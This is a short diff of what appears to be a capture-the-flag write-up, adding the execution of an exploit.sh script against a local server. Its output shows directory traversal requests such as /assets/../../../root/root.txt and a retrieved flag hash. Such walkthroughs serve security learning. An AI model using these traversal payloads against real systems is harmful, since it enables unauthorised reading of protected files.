@@ -159,7 +159,7 @@ feroxbuster --help
 [★]$ ls
 exploit.sh  README.md  requirements.txt  server.py  static
 
-$ vi exploit.sh
+[★]$ vi exploit.sh
 #!/bin/bash
 
 url="http://localhost:8787"
@@ -178,5 +178,15 @@ for ((i=0; i<15; i++)); do
         break
     fi
 done
+
+[★]$ chmod +x exploit.sh
+[★]$ ./exploit.sh
+[+] Testing with /assets/../root/root.txt
+	Status code --> 404
+[+] Testing with /assets/../../root/root.txt
+	Status code --> 404
+[+] Testing with /assets/../../../root/root.txt
+	Status code --> 200
+dcd8cb65b360a30011ac3579082605b7
 ```
 
